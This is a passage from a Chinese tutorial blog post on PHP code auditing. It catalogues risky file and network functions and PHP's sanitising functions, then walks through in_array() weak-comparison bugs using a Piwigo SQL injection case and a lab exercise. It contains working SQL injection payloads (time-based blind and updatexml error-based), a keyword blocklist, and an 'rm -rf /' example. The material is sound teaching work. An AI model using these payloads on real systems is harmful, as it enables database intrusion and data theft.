title="文件读取&#x2F;SSRF"></a>文件读取&#x2F;SSRF</h2><table><thead><tr><th>函数</th><th>描述</th><th>例子</th></tr></thead><tbody><tr><td><code>file_get_contents</code></td><td>读入文件并返回字符串</td><td><code>echo file_get_contents(&quot;flag.txt&quot;);</code> <br> <code>echo file_get_contents(&quot;https://www.bilibili.com/&quot;);</code></td></tr><tr><td><code>curl_setopt</code>, <code>curl_exec</code></td><td>Curl访问URL获取信息</td><td><code>function curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_exec($ch); curl_close($ch); &#125; $url = $_GET[&#39;url&#39;]; curl($url);</code></td></tr><tr><td><code>fsockopen</code></td><td>打开一个套接字连接（远程TCP&#x2F;UDP&#x2F;raw）</td><td><a href="https://www.php.net/manual/zh/function.fsockopen.php">fsockopen函数说明</a></td></tr><tr><td><code>readfile</code></td><td>读取文件并写入输出缓冲区</td><td>类似于<code>file_get_contents</code>，读取文件流</td></tr><tr><td><code>fopen</code>, <code>fread</code>, <code>fgets</code>, etc.</td><td>打开文件或URL并读取文件流</td><td><code>$file = fopen(&quot;test.txt&quot;,&quot;r&quot;); echo fread($file,&quot;1234&quot;); fclose($file);</code></td></tr><tr><td><code>file</code></td><td>将整个文件读入数组</td><td><code>echo implode(&#39;&#39;, file(&#39;https://www.bilibili.com/&#39;));</code></td></tr><tr><td><code>highlight_file</code>, <code>show_source</code></td><td>语法高亮显示文件内容</td><td><code>highlight_file(&quot;1.php&quot;);</code></td></tr><tr><td><code>parse_ini_file</code></td><td>读取并解析一个ini配置文件</td><td><code>print_r(parse_ini_file(&#39;1.ini&#39;));</code></td></tr><tr><td><code>simplexml_load_file</code></td><td>将文件读取并作为XML文档解析</td><td><code>simplexml_load_file(&#39;test.xml&#39;);</code></td></tr><tr><td><strong><code>stream_socket_client</code></strong></td><td>打开一个基于流的套接字连接，用于更灵活的网络通信</td><td><code>$fp = stream_socket_client(&quot;tcp://example.com:80&quot;, $errno, $errstr, 30);</code></td></tr><tr><td><strong><code>get_headers</code></strong></td><td>获取HTTP请求头信息</td><td><code>print_r(get_headers(&quot;https://www.example.com&quot;));</code></td></tr><tr><td><strong><code>file_put_contents</code></strong></td><td>将字符串写入文件</td><td><code>file_put_contents(&quot;test.txt&quot;, &quot;data to write&quot;);</code></td></tr><tr><td><strong><code>copy</code></strong></td><td>拷贝文件到另一个位置</td><td><code>copy(&quot;source.txt&quot;, &quot;destination.txt&quot;);</code></td></tr><tr><td><strong><code>move_uploaded_file</code></strong></td><td>将上传的文件移动到新位置</td><td><code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;upload_dir/&quot;.$_FILES[&#39;file&#39;][&#39;name&#39;]);</code></td></tr><tr><td><strong><code>parse_url</code></strong></td><td>解析URL并返回其组成部分</td><td><code>$url_components = parse_url(&quot;http://www.example.com/path?query=string&quot;);</code></td></tr><tr><td><strong><code>stream_context_create</code></strong></td><td>创建并设置流上下文用于文件或网络连接</td><td><code>$context = stream_context_create([&#39;http&#39; =&gt; [&#39;method&#39; =&gt; &#39;GET&#39;]]); file_get_contents(&quot;https://www.example.com&quot;, false, $context);</code></td></tr></tbody></table><p>补充：</p><ul><li>**<code>stream_socket_client</code>**：比<code>fsockopen</code>更加灵活，用于创建各种类型的网络连接（如TCP、UDP）。</li><li>**<code>get_headers</code>**：可以获取指定URL的HTTP响应头。</li><li>**<code>file_put_contents</code>**：可以写入文件，功能类似于<code>fopen</code>+<code>fwrite</code>，但更简便。</li><li>**<code>copy</code>**：可以直接将文件从一个路径复制到另一个路径。</li><li>**<code>move_uploaded_file</code>**：处理文件上传时使用，用于将临时文件移动到指定目录。</li><li>**<code>parse_url</code>**：用于解析URL，返回其组成部分，例如协议、主机名、路径等。</li><li>**<code>stream_context_create</code>**：用于为文件读取&#x2F;写入创建和设置流上下文，比如可以设置HTTP请求头。</li></ul><h2 id="文件上传-写入"><a href="#文件上传-写入" class="headerlink" title="文件上传&#x2F;写入"></a>文件上传&#x2F;写入</h2><table><thead><tr><th>函数&#x2F;方法</th><th>描述</th><th>例子</th></tr></thead><tbody><tr><td><code>file_put_contents</code></td><td>将一个字符串写入文件</td><td><code>file_put_contents(&quot;1.txt&quot;, &quot;6666&quot;);</code></td></tr><tr><td><code>move_uploaded_file</code></td><td>将上传的临时文件移动到新的位置</td><td><code>move_uploaded_file($_FILES[&quot;pictures&quot;][&quot;tmp_name&quot;], &quot;1.php&quot;);</code></td></tr><tr><td><code>rename</code></td><td>重命名文件&#x2F;目录</td><td><code>rename($oldname, $newname);</code></td></tr><tr><td><code>rmdir</code></td><td>删除目录</td><td><code>rmdir(&quot;directory_name&quot;);</code></td></tr><tr><td><code>mkdir</code></td><td>创建目录</td><td><code>mkdir(&quot;new_directory&quot;);</code></td></tr><tr><td><code>unlink</code></td><td>删除文件</td><td><code>unlink(&quot;file.txt&quot;);</code></td></tr><tr><td><code>copy</code></td><td>复制文件</td><td><code>copy(&quot;source.txt&quot;, &quot;destination.txt&quot;);</code></td></tr><tr><td><code>fopen</code>, <code>fputs</code>, <code>fwrite</code></td><td>打开文件或URL</td><td><a href="https://www.php.net/manual/zh/function.fwrite.php">fwrite官方文档</a></td></tr><tr><td><code>link</code></td><td>创建文件硬链接</td><td><code>link($target, $link);</code></td></tr><tr><td><code>symlink</code></td><td>创建符号链接（软链接）</td><td><code>symlink($target, $link);</code></td></tr><tr><td><code>tmpfile</code></td><td>创建一个临时文件（在临时目录存放，随机文件名，返回句柄）</td><td><code>$temp = tmpfile(); fwrite($temp, &quot;123456&quot;); fclose($temp);</code></td></tr><tr><td><code>request()-&gt;file()-&gt;move()</code></td><td>ThinkPHP文件上传</td><td><code>$file = request()-&gt;file($name); $file-&gt;move($filepath);</code></td></tr><tr><td><code>request()-&gt;file()-&gt;file()</code></td><td>ThinkPHP文件上传</td><td><code>$file = request()-&gt;file(&#39;upload&#39;);</code></td></tr><tr><td><code>extractTo</code></td><td>解压ZIP到目录</td><td><code>$zip-&gt;extractTo(&#39;path/to/extract&#39;);</code></td></tr><tr><td><code>DOMDocument loadXML simplexml_import_dom</code></td><td>加载解析XML，可能存在XXE漏洞，通过<code>file_get_contents</code>获取客户端输入并加载XML内容</td><td><code>&lt;?php $xmlfile = file_get_contents(&#39;php://input&#39;); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile); ?&gt;</code></td></tr><tr><td><code>simplexml_load_string</code></td><td>加载解析XML字符串，可能存在XXE漏洞</td><td><code>$xml = simplexml_load_string($_REQUEST[&#39;xml&#39;]); print_r($xml);</code></td></tr><tr><td><code>simplexml_load_file</code></td><td>读取文件并作为XML文档解析，可能存在XXE漏洞</td><td><code>simplexml_load_file(&#39;file.xml&#39;);</code></td></tr><tr><td><code>unserialize</code></td><td>反序列化对象</td><td><code>$data = unserialize($_POST[&#39;data&#39;]);</code></td></tr><tr><td><strong><code>fgetcsv</code></strong></td><td>读取并解析CSV格式的行</td><td><code>$handle = fopen(&quot;data.csv&quot;, &quot;r&quot;); while (($data = fgetcsv($handle)) !== FALSE) &#123; print_r($data); &#125; fclose($handle);</code></td></tr><tr><td><strong><code>file_exists</code></strong></td><td>检查文件或目录是否存在</td><td><code>if (file_exists(&quot;file.txt&quot;)) &#123; echo &quot;File exists&quot;; &#125;</code></td></tr><tr><td><strong><code>is_readable</code></strong></td><td>判断文件是否可读</td><td><code>if (is_readable(&quot;file.txt&quot;)) &#123; echo &quot;File is readable&quot;; &#125;</code></td></tr><tr><td><strong><code>is_writable</code></strong></td><td>判断文件是否可写</td><td><code>if (is_writable(&quot;file.txt&quot;)) &#123; echo &quot;File is writable&quot;; &#125;</code></td></tr><tr><td><strong><code>flock</code></strong></td><td>锁定文件防止并发读写</td><td><code>$fp = fopen(&quot;file.txt&quot;, &quot;r+&quot;); if (flock($fp, LOCK_EX)) &#123; fwrite($fp, &quot;Lock test&quot;); flock($fp, LOCK_UN); &#125; fclose($fp);</code></td></tr><tr><td><strong><code>readlink</code></strong></td><td>返回符号链接指向的目标</td><td><code>echo readlink(&quot;/path/to/symlink&quot;);</code></td></tr><tr><td><strong><code>realpath</code></strong></td><td>返回文件或目录的绝对路径</td><td><code>echo realpath(&quot;test.txt&quot;);</code></td></tr><tr><td><strong><code>chmod</code></strong></td><td>改变文件或目录的权限</td><td><code>chmod(&quot;file.txt&quot;, 0755);</code></td></tr><tr><td><strong><code>chown</code></strong></td><td>改变文件的所有者</td><td><code>chown(&quot;file.txt&quot;, &quot;username&quot;);</code></td></tr></tbody></table><h2 id="PHP原生过滤方法"><a href="#PHP原生过滤方法" class="headerlink" title="PHP原生过滤方法"></a>PHP原生过滤方法</h2><h3 id="1-命令注入防护"><a href="#1-命令注入防护" class="headerlink" title="1. 命令注入防护"></a>1. <strong>命令注入防护</strong></h3><ul><li><strong><code>escapeshellarg</code></strong><ul><li><strong>描述</strong>：将传入的参数添加单引号并转义原有的单引号，主要用于防止命令注入。处理后的字符串可安全地作为命令参数。</li><li><strong>例子</strong>：传入<code>id</code>后处理为<code>&#39;id&#39;</code>。如果传入<code>&#39;id #</code>，处理后为<code>&#39;\&#39;id #&#39;</code>，防止命令注入。</li><li><strong>用法</strong>：<code>escapeshellarg($arg);</code></li></ul></li><li><strong><code>escapeshellcmd</code></strong><ul><li><strong>描述</strong>：转义字符串中的特殊符号，用于防止命令注入。反斜线会在以下字符之前插入：<code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。’ 和 “ 仅在不配对时被转义。</li><li><strong>例子</strong>：<code>escapeshellcmd(&#39;ls; rm -rf /&#39;)</code>将转义命令中的特殊字符，避免命令注入。</li><li><strong>用法</strong>：<code>escapeshellcmd($cmd);</code></li></ul></li></ul><h3 id="2-SQL注入防护"><a href="#2-SQL注入防护" class="headerlink" title="2. SQL注入防护"></a>2. <strong>SQL注入防护</strong></h3><ul><li><strong><code>addslashes</code></strong><ul><li><strong>描述</strong>：在单引号（’）、双引号（”）、反斜线（\）与 NUL 前加上反斜线，用于防止SQL注入。</li><li><strong>例子</strong>：<code>addslashes(&quot;O&#39;Reilly&quot;)</code>返回<code>O\&#39;Reilly</code>，可以减少SQL注入风险。</li><li><strong>用法</strong>：<code>addslashes($input);</code></li></ul></li><li><strong><code>mysqli::real_escape_string</code> &#x2F; <code>mysqli_real_escape_string</code></strong><ul><li><strong>描述</strong>：这些函数在 NULL (<code>\x00</code>), 换行符 (<code>\n</code>), 回车符 (<code>\r</code>), 空格字符 (<code>\x1a</code>), 单引号 (<code>&#39;</code>), 双引号 (<code>&quot;</code>) 和反斜线 (<code>\</code>) 前加上反斜线，并考虑到当前数据库连接的字符集。用于防止SQL注入。</li><li><strong>注意</strong>：处理后的字符串需要使用引号包裹后拼接到SQL语句中，否则仍可导致SQL注入。</li><li><strong>例子</strong>：<code>$conn-&gt;real_escape_string($input);</code></li></ul></li><li><strong><code>PDO::quote</code></strong><ul><li><strong>描述</strong>：将字符串中的特殊字符进行转义，并为字符串添加引号。适用于防止SQL注入。</li><li><strong>例子</strong>：<code>$pdo-&gt;quote(&quot;O&#39;Reilly&quot;);</code> 返回 <code>&#39;O\&#39;Reilly&#39;</code></li><li><strong>用法</strong>：<code>$pdo-&gt;quote($input);</code></li></ul></li><li><strong><code>PDO::prepare</code></strong><ul><li><strong>描述</strong>：预处理SQL语句，确保参数传递时不会破坏SQL语句的结构，是防止SQL注入的最佳实践。</li><li><strong>例子</strong>：<code>$stmt = $pdo-&gt;prepare(&#39;SELECT * FROM users WHERE id = :id&#39;);</code></li><li><strong>用法</strong>：<code>$stmt-&gt;execute([&#39;:id&#39; =&gt; $id]);</code></li></ul></li></ul><h3 id="3-XSS防护"><a href="#3-XSS防护" class="headerlink" title="3. XSS防护"></a>3. <strong>XSS防护</strong></h3><ul><li><strong><code>htmlspecialchars</code></strong><ul><li><strong>描述</strong>：将特殊字符（如 <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>&#39;</code>, <code>&quot;</code>）转义为HTML实体，防止恶意脚本通过HTML注入XSS攻击。</li><li><strong>例子</strong>：<code>htmlspecialchars(&#39;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#39;)</code> 将输出 <code>&amp;lt;script&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/script&amp;gt;</code></li><li><strong>用法</strong>：<code>htmlspecialchars($input, ENT_QUOTES, &#39;UTF-8&#39;);</code></li></ul></li><li><strong><code>htmlentities</code></strong><ul><li><strong>描述</strong>：将所有的适合的字符转义为HTML实体，与<code>htmlspecialchars</code>类似，但更加严格。</li><li><strong>例子</strong>：<code>htmlentities(&#39;&lt;b&gt;bold&lt;/b&gt;&#39;)</code> 返回 <code>&amp;lt;b&amp;gt;bold&amp;lt;/b&amp;gt;</code></li><li><strong>用法</strong>：<code>htmlentities($input, ENT_QUOTES, &#39;UTF-8&#39;);</code></li></ul></li></ul><h3 id="4-数字类型过滤"><a href="#4-数字类型过滤" class="headerlink" title="4. 数字类型过滤"></a>4. <strong>数字类型过滤</strong></h3><ul><li><strong><code>intval</code> &#x2F; <code>floatval</code> &#x2F; <code>(int)</code> &#x2F; <code>num+0</code></strong><ul><li><strong>描述</strong>：将输入强制转换为整数或浮点数。通常用于确保输入为数字，防止SQL注入或逻辑漏洞。</li><li><strong>例子</strong>：<ul><li><code>intval(&#39;42abc&#39;)</code> 返回 <code>42</code></li><li><code>floatval(&#39;42.42abc&#39;)</code> 返回 <code>42.42</code></li><li><code>(int) &#39;123abc&#39;</code> 返回 <code>123</code></li></ul></li><li><strong>用法</strong>：<code>intval($input);</code> 或 <code>(int)$input;</code></li></ul></li></ul><h3 id="5-其他防护配置项"><a href="#5-其他防护配置项" class="headerlink" title="5. 其他防护配置项"></a>5. <strong>其他防护配置项</strong></h3><ul><li><strong>配置防止命令注入</strong>：<ul><li><strong>禁用危险函数</strong>：通过PHP的配置文件<code>php.ini</code>，可以禁用危险函数如<code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>等。</li><li><strong>配置</strong>：<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">disable_functions</span> = <span class="string">&quot;exec, passthru, shell_exec, system, proc_open, popen, curl_exec&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>限制文件操作</strong>：可以通过<code>open_basedir</code>限制PHP对特定目录的访问，防止通过路径注入或文件包含漏洞来执行恶意文件。</li><li><strong>配置</strong>：<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">open_basedir</span> = <span class="string">&quot;/var/www/html:/tmp&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="in-array-缺陷"><a href="#in-array-缺陷" class="headerlink" title="in_array() 缺陷"></a>in_array() 缺陷</h2><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image.png"><br>分析上面的代码流程，是一个文件上传的接口，但是对文件名有白名单，利用了<code>in_array()</code>方法，这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">in_array ：(PHP 4, PHP 5, PHP 7)</span><br><span class="line">功能 ：检查数组中是否存在某个值</span><br><span class="line">定义 ： bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</span><br><span class="line">在 $haystack 中搜索 $needle ，如果第三个参数 $strict 的值为 TRUE ，则 in_array() 函数会进行强检查，检查 $needle 的类型是否和 $haystack 中的相同。如果找到 $haystack ，则返回 TRUE，否则返回 FALSE。</span><br></pre></td></tr></table></figure><p>由于该函数并未将第三个参数设置为 true ，这导致攻击者可以通过构造的文件名来绕过服务端的检测，例如文件名为 7shell.php 。因为PHP在使用 in_array() 函数判断时，会将 7shell.php 强制转换成数字7，而数字7在 range(1,24) 数组中，最终绕过 in_array() 函数判断，导致任意文件上传漏洞。（这里之所以会发生强制类型转换，是因为目标数组中的元素为数字类型）我们来看看PHP手册对 in_array() 函数的定义。</p><h3 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h3><p>下面看一个具体的真实案例：piwigo2.7.1 版本。该版本由于SQL语句直接拼接 $rate 变量，而 $rate 变量也仅是用 in_array() 函数简单处理，并未使用第三个参数进行严格匹配，最终导致sql注入漏洞发生。下面我们来看看具体的漏洞位置。漏洞的入口文件在<code>picture.php</code>文件中，<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-1.png"><br>当 <code>$_GET[&#39;action&#39;]</code> 为 rate 的时候，就会调用文件 include&#x2F;functions_rate.inc.php 中的 rate_picture 方法，而漏洞便存在这个方法中。我们可以看到下图第23行处直接拼接 $rate 变量，而在第2行使用 in_array() 函数对 $rate 变量进行检测，判断 $rate 是否在 <code>$conf[&#39;rate_items&#39;]</code> 中， <code>$conf[&#39;rate_items&#39;]</code> 的内容可以在 include\config_default.inc.php 中找到，为 <code>$conf[&#39;rate_items&#39;] = array(0,1,2,3,4,5)</code>;<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-2.png"><br>由于这里（上图第6行）并没有将 in_array() 函数的第三个参数设置为 true ，所以会进行弱比较，可以绕过。比如我们将 $rate 的值设置成 <code>1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#</code> 那么SQL语句就变成：<br><code>INSERT INTO piwigo_rate (user_id,anonymous_id,element_id,rate,date) VALUES (2,&#39;192.168.2&#39;,1,1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#,NOW()) ;</code><br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-3.png" alt="流程可以简化为此图"><br>可以看到这个漏洞的原因是弱类型比较问题，那么我们就可以使用强匹配进行修复。例如将 in_array() 函数的第三个参数设置为 true ，或者使用 intval() 函数将变量强转成数字，又或者使用正则匹配来处理变量。这里我将 in_array() 函数的第三个参数设置为 true ，代码及防护效果如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-4.png"></p><h3 id="作业题目"><a href="#作业题目" class="headerlink" title="作业题目"></a>作业题目</h3><p>审计下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT COUNT(*) FROM users&quot;</span>;</span><br><span class="line"><span class="variable">$whitelist</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="title function_ invoke__">range</span>(<span class="number">1</span>, <span class="variable">$row</span>[<span class="string">&#x27;COUNT(*)&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">stop_hack</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$id</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;id <span class="subst">$id</span> is not in whitelist.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;<span class="subst">$key</span>&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&lt;center&gt;<span class="subst">$value</span>&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$conn</span>-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;day1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stop_hack</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;</span>;</span><br><span class="line"><span class="variable">$back_list</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$back_list</span> <span class="keyword">as</span> <span class="variable">$hack</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$hack</span>/i&quot;</span>, <span class="variable">$value</span>))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;<span class="subst">$hack</span> detected!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>题目可以看出，首先需要绕过in_array之后由于sql语句过滤，需要考虑绕过。前者加个数字就好，后者可以用 updatexml 注入。当 updatexml 中存在特殊字符或字母时，会出现报错，报错信息为特殊字符、字母及之后的内容，也就是说如果我们想要查询的数据是数字开头，例如 7701HongRi ，那么查询结果只会显示 HongRi 。所以我们会看到很多 updatexml 注入的 payload 是长这样的 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) ,在所要查询的数据前面凭借一个特殊符号(这里的 0x7e 为符号 ‘<del>‘ )。使用下面的payload可以获得题解：<br>&#96;<a href="http://localhost/index.php?id=4">http://localhost/index.php?id=4</a> and (select updatexml(1,make_set(3,’</del>‘,(select flag from flag)),1))&#96;</p><h2 id="Twig-过滤不充分"><a href="#Twig-过滤不充分" class="headerlink" title="Twig 过滤不充分"></a>Twig 过滤不充分</h2><p>题目叫做Twig，代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-5.png"><br><strong>漏洞解析</strong> ：<br>这一关题目实际上用的是PHP的一个模板引擎 <a href="https://twig.symfony.com/">Twig</a> ，本题考察XSS(跨站脚本攻击)漏洞。虽然题目代码分别用了 <strong>escape</strong> 和 <strong>filter_var</strong> 两个过滤方法，但是还是可以被攻击者绕过。在上图 <strong>第8行</strong> 中，程序使用 <a href="https://twig.symfony.com/">Twig</a> 模板引擎定义的 <strong>escape</strong> 过滤器来过滤link，而实际上这里的 <strong>escape</strong> 过滤器，是用PHP内置函数 <strong>htmlspecialchars</strong> 来实现的，具体可以点击 <a href="https://twig.symfony.com/doc/2.x/filters/escape.html">这里</a> 了解 <strong>escape</strong> 过滤器， <strong>htmlspecialchars</strong> 函数定义如下：</p><blockquote><p><a href="http://php.net/manual/zh/function.htmlspecialchars.php"> <strong>htmlspecialchars</strong> </a> ：(PHP 4, PHP 5, PHP 7)</p><p><strong>功能</strong> ：将特殊字符转换为 HTML 实体</p><p><strong>定义</strong> ：string <strong>htmlspecialchars</strong> ( string <code>$string</code> [, int <code>$flags</code> &#x3D; ENT_COMPAT | ENT_HTML401 [, string<code>$encoding</code> &#x3D; ini_get(“default_charset”) [, bool <code>$double_encode</code> &#x3D; <strong>TRUE</strong> ]]] )</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; (&amp; 符号)  ===============  &amp;amp;</span><br><span class="line"><span class="string">&quot; (双引号)  ===============  &amp;quot;</span></span><br><span class="line"><span class="string">&#x27; (单引号)  ===============  &amp;apos;</span></span><br><span class="line"><span class="string">&lt; (小于号)  ===============  &amp;lt;</span></span><br><span class="line"><span class="string">&gt; (大于号)  ===============  &amp;gt;</span></span><br></pre></td></tr></table></figure><p>第二处过滤在 <strong>第17行</strong> ，这里用了 <strong>filter_var</strong> 函数来过滤 <strong>nextSlide</strong> 变量，且用了 <strong>FILTER_VALIDATE_URL</strong> 过滤器来判断是否是一个合法的url，具体的 <strong>filter_var</strong> 定义如下：<br><a href="http://php.net/manual/zh/function.filter-var.php"> <strong>filter_var</strong> </a>： (PHP 5 &gt;&#x3D; 5.2.0, PHP 7)</p><p><strong>功能</strong> ：使用特定的过滤器过滤一个变量</p><p><strong>定义</strong> ：<a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <strong>filter_var</strong> ( <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$variable</code> [, int <code>$filter</code> &#x3D; FILTER_DEFAULT [, <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$options</code> ]] )<br><strong>函数原型</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">mixed</span> <span class="title function_ invoke__">filter_var</span> ( <span class="keyword">mixed</span> <span class="variable">$variable</span> [, <span class="keyword">int</span> <span class="variable">$filter</span> = FILTER_DEFAULT [, <span class="keyword">mixed</span> <span class="variable">$options</span> ]] )</span><br></pre></td></tr></table></figure><ul><li><strong>$variable</strong>: 要过滤的变量。</li><li><strong>$filter</strong>: 用于过滤的过滤器 ID。如果不提供，默认为 <code>FILTER_DEFAULT</code>。</li><li><strong>$options</strong>: 一个关联数组或单一的标志，指定额外的过滤器选项和标志。<br>常用的过滤器选项<br>PHP 提供了多种过滤器，可以分为两类：验证过滤器和清理过滤器。验证过滤器用于验证数据格式，如果数据无效，则返回 <code>false</code>；清理过滤器用于清理数据，如去除非法字符等。<br>验证过滤器</li><li><strong>FILTER_VALIDATE_BOOLEAN</strong>: 验证布尔值。</li><li><strong>FILTER_VALIDATE_EMAIL</strong>: 